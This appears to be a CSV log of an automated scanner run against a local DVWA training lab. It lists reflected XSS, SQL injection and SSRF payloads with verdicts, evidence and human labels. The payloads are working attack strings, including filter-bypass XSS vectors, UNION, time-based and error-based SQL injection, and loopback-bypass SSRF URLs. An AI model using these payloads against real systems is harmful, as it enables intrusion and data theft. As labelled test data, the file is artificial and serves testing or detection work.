@@ -1,0 +1,45 @@
+﻿序号,时间戳,漏洞类型,用例ID,载荷,请求端点,HTTP状态,判定结果,置信度,证据,响应长度,耗时ms,人工标注,标注一致性,来源,备注
+1,2026-11-01 17:08:15,xss_r,xss_r_001,<script>alert('nxzpxdc2g8')</script>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4354,42,vuln,一致,dataset,基础 script 标签，验证是否存在转义
+2,2026-11-01 17:08:15,xss_r,xss_r_002,<ScRiPt>alert('nx2ntdzar4')</ScRiPt>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4354,45,vuln,一致,dataset,大小写混淆，绕过基于小写正则的黑名单
+3,2026-11-01 17:08:16,xss_r,xss_r_003,<img src=x onerror=alert('nxnbl40yq6')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4357,44,vuln,一致,dataset,事件属性型，不依赖 script 标签
+4,2026-11-01 17:08:16,xss_r,xss_r_004,<svg/onload=alert('nxf5naqco0')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4350,42,vuln,一致,dataset,SVG 标签自闭合 + 事件属性
+5,2026-11-01 17:08:16,xss_r,xss_r_005,"""><script>alert('nxtku38g0p')</script>",vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4356,45,vuln,一致,dataset,双引号闭合属性后注入 script
+6,2026-11-01 17:08:16,xss_r,xss_r_006,'><svg/onload=alert('nxg5b916km')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4352,29,vuln,一致,dataset,单引号闭合 + SVG 事件
+7,2026-11-01 17:08:17,xss_r,xss_r_007,<body onload=alert('nxb7alf24v')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4351,43,vuln,一致,dataset,body 事件属性型
+8,2026-11-01 17:08:17,xss_r,xss_r_008,"<a href=""javascript:alert('nxs6bgsac2')"">click</a>",vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4368,45,vuln,一致,dataset,伪协议型，需用户交互，证明可注入可执行链接
+9,2026-11-01 17:08:17,xss_r,xss_r_009,<svg><script>alert('nxt6ypr4bf')</script></svg>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4365,44,vuln,一致,dataset,SVG 命名空间内嵌 script
+10,2026-11-01 17:08:18,xss_r,xss_r_010,<<script>alert('nxtezxg57o');//</script>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4358,44,vuln,一致,dataset,双写尖括号干扰标签匹配
+11,2026-11-01 17:08:18,xss_r,xss_r_011,<scr<script>ipt>alert('nxhu6zawsg')</script>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4362,44,vuln,一致,dataset,嵌套标签，针对单次替换式过滤
+12,2026-11-01 17:08:18,xss_r,xss_r_012,<details open ontoggle=alert('nxr89988x9')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4361,45,vuln,一致,dataset,details/ontoggle 自动触发事件
+13,2026-11-01 17:08:18,xss_r,xss_r_013,"<iframe srcdoc=""<script>alert('nxs154qujs')</script>"">",vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4372,44,vuln,一致,dataset,srcdoc 内联文档执行脚本
+14,2026-11-01 17:08:19,xss_r,xss_r_014,<img src=1 onerror=alert('nxa21iesi8')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4357,43,vuln,一致,dataset,属性值不加引号，测试属性解析畸形
+15,2026-11-01 17:08:19,xss_r,xss_r_015,"""><img src=x onerror=alert('nx4n8sbf48')>",vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4359,47,vuln,一致,dataset,闭合后改用 img 事件
+16,2026-11-01 17:08:19,xss_r,xss_r_016,<video><source onerror=alert('nxfj80nepq')>,vulnerabilities/xss_r/,200,REFLECTED_UNESCAPED,high,随机标记原样回显且保留可执行结构，响应中存在未转义的脚本注入面,4361,42,vuln,一致,dataset,video/source 事件型，覆盖少见标签
+17,2026-11-01 17:08:20,xss_r,xss_r_017,&lt;script&gt;alert('nxmqsxpeid')&lt;/script&gt;,vulnerabilities/xss_r/,200,REFLECTED_PLAIN,medium,随机标记原样回显，但载荷不含可执行结构，仅证明回显未过滤,4366,44,clean,一致,dataset,实体编码对照：浏览器不会解析为标签
+18,2026-11-01 17:08:20,xss_r,xss_r_018,plain-text-nx7nf934rm,vulnerabilities/xss_r/,200,REFLECTED_PLAIN,medium,随机标记原样回显，但载荷不含可执行结构，仅证明回显未过滤,4339,44,clean,一致,dataset,纯文本对照：只验证回显，不构成注入
+19,2026-11-01 17:08:20,sqli,sqli_001,1' OR '1'='1,vulnerabilities/sqli/,200,BOOLEAN_DIFF,medium,结果行数由基线 1 变为 5，存在布尔逻辑差异,4496,44,vuln,一致,dataset,恒真条件，返回全量记录
+20,2026-11-01 17:08:21,sqli,sqli_002,1' OR 1=1-- -,vulnerabilities/sqli/,200,BOOLEAN_DIFF,medium,结果行数由基线 1 变为 5，存在布尔逻辑差异,4501,42,vuln,一致,dataset,注释符截断后半段查询
+21,2026-11-01 17:08:21,sqli,sqli_003,1' OR 1=1#,vulnerabilities/sqli/,200,BOOLEAN_DIFF,medium,结果行数由基线 1 变为 5，存在布尔逻辑差异,4486,43,vuln,一致,dataset,井号注释，覆盖不同注释符
+22,2026-11-01 17:08:21,sqli,sqli_004,1' AND '1'='2,vulnerabilities/sqli/,200,BOOLEAN_DIFF,medium,结果行数由基线 1 变为 0，存在布尔逻辑差异,4149,42,vuln,一致,dataset,布尔为假，结果集为空，构成差分证据
+23,2026-11-01 17:08:21,sqli,sqli_005,"1' UNION SELECT 1,'nxd8xsehon'-- -",vulnerabilities/sqli/,200,UNION_MARKER,high,联合查询标记出现在结果集中，注入点可回显数据,4334,29,vuln,一致,dataset,联合查询回显随机标记，2 列匹配
+24,2026-11-01 17:08:22,sqli,sqli_006,"-1' UNION SELECT 1,'nx5dsgy81e'-- -",vulnerabilities/sqli/,200,UNION_MARKER,high,联合查询标记出现在结果集中，注入点可回显数据,4243,45,vuln,一致,dataset,负值主查询置空，确保只回显注入行
+25,2026-11-01 17:08:24,sqli,sqli_007,1' AND SLEEP(2)-- -,vulnerabilities/sqli/,200,TIME_DELAY,high,响应延迟 2048ms（阈值 800ms），疑似时间盲注生效,4149,2048,vuln,一致,dataset,时间盲注，观察响应延迟
+26,2026-11-01 17:08:25,sqli,sqli_008,"1' AND IF(1=1,SLEEP(1),0)-- -",vulnerabilities/sqli/,200,TIME_DELAY,high,响应延迟 1053ms（阈值 800ms），疑似时间盲注生效,4149,1053,vuln,一致,dataset,条件时间盲注，确认延迟由表达式触发
+27,2026-11-01 17:08:26,sqli,sqli_009,"1' AND updatexml(1,concat(0x7e,database()),1)-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：mysqli_sql_exception,507,46,vuln,一致,dataset,报错注入，利用 XPath 报错回显库名
+28,2026-11-01 17:08:26,sqli,sqli_010,"1' AND extractvalue(1,concat(0x7e,database()))-- -",vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：mysqli_sql_exception,507,46,vuln,一致,dataset,extractvalue 报错注入
+29,2026-11-01 17:08:26,sqli,sqli_011,1' OR '1'='1' --,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：You have an error in your SQL syntax,629,45,vuln,一致,dataset,带空格的注释符，覆盖不同截断写法
+30,2026-11-01 17:08:26,sqli,sqli_012,1' ORDER BY 3-- -,vulnerabilities/sqli/,200,SQL_ERROR,high,响应出现数据库报错特征：mysqli_sql_exception,516,43,vuln,一致,dataset,列数探测，3 列越界触发报错
+31,2026-11-01 17:08:27,sqli,sqli_013,1,vulnerabilities/sqli/,200,NO_EFFECT,low,未观测到报错、标记、延迟或长度差异,4208,43,clean,一致,dataset,正常输入对照：应与基线一致
+32,2026-11-01 17:08:27,sqli,sqli_014,abc,vulnerabilities/sqli/,200,NO_EFFECT,low,未观测到报错、标记、延迟或长度差异,4149,45,clean,一致,dataset,非数字对照：仅返回空结果，不构成注入证据
+33,2026-11-01 17:08:27,sqli,sqli_015,1' AND 1=2-- -,vulnerabilities/sqli/,200,BOOLEAN_DIFF,medium,结果行数由基线 1 变为 0，存在布尔逻辑差异,4149,42,vuln,一致,dataset,恒假条件，结果集为空
+34,2026-11-01 17:08:28,ssrf,ssrf_001,http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=nxchextrbz,http://127.0.0.1/ssrf-lab/,200,CONTENT_DIFF,medium,响应体比失败控制组多 2068 字节，疑似回显内部资源,3089,89,vuln,一致,dataset,指向靶场内部反射页，用随机标记证明服务端确实抓取
+35,2026-11-01 17:08:29,ssrf,ssrf_002,http://127.0.0.1/dvwa/,http://127.0.0.1/ssrf-lab/,200,CONTENT_DIFF,medium,响应体比失败控制组多 2068 字节，疑似回显内部资源,3089,75,vuln,一致,dataset,抓取本机 DVWA 首页
+36,2026-11-01 17:08:29,ssrf,ssrf_003,http://127.0.0.1/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,SSRF_CONFIRMED,medium,响应包含目标页面的内容指纹，服务端确实抓取了内部资源,3089,55,vuln,一致,dataset,抓取本机登录页，验证内部页面可达
+37,2026-11-01 17:08:30,ssrf,ssrf_004,http://localhost/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,SSRF_CONFIRMED,medium,响应包含目标页面的内容指纹，服务端确实抓取了内部资源,3089,60,vuln,一致,dataset,主机名写法绕过，覆盖 localhost 解析
+38,2026-11-01 17:08:30,ssrf,ssrf_005,http://127.0.0.1:80/dvwa/,http://127.0.0.1/ssrf-lab/,200,CONTENT_DIFF,medium,响应体比失败控制组多 2068 字节，疑似回显内部资源,3089,91,vuln,一致,dataset,显式端口写法
+39,2026-11-01 17:08:31,ssrf,ssrf_006,http://127.1/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1021,4,未标注,未标注,dataset,回环地址省略写法；是否可解析取决于系统解析器，本机实测返回空响应，故不作标注
+40,2026-11-01 17:08:47,ssrf,ssrf_007,http://2130706433/dvwa/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1021,7261,未标注,未标注,dataset,十进制回环地址，是否可解析取决于系统解析器，本机实测返回空响应，故不作标注
+41,2026-11-01 17:08:48,ssrf,ssrf_008,http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit,http://127.0.0.1/ssrf-lab/,200,CONTENT_DIFF,medium,响应体比失败控制组多 2068 字节，疑似回显内部资源,3089,75,vuln,一致,dataset,抓取内部注入页面，响应包含用户表数据
+42,2026-11-01 17:08:48,ssrf,ssrf_009,http://127.0.0.1/dvwa/vulnerabilities/exec/,http://127.0.0.1/ssrf-lab/,200,CONTENT_DIFF,medium,响应体比失败控制组多 2068 字节，疑似回显内部资源,3089,107,vuln,一致,dataset,抓取内部命令执行页面，验证横向可达
+43,2026-11-01 17:08:58,ssrf,ssrf_010,http://127.0.0.1:1/,http://127.0.0.1/ssrf-lab/,200,NO_EFFECT,low,未观测到内部资源回显,1021,2045,clean,一致,dataset,失败对照：未监听端口，服务端抓取应报错
+44,2026-11-01 17:08:58,ssrf,ssrf_011,http://[::1]/dvwa/login.php,http://127.0.0.1/ssrf-lab/,200,SSRF_CONFIRMED,medium,响应包含目标页面的内容指纹，服务端确实抓取了内部资源,3089,48,vuln,一致,dataset,IPv6 回环写法，用于绕过只拦截 127.0.0.1 / localhost 的黑名单
